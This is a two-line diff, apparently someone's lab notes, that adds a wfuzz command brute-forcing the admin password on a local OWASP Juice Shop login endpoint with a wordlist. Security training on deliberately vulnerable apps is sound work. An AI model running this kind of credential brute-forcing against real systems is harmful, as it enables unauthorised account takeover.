@@ -1,0 +1,2 @@
+command:
+wfuzz -c -w /home/kali/Desktop/test.txt -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' -H "Content-Type: application/json" -Z --sc 200 http://localhost:3000/rest/user/login
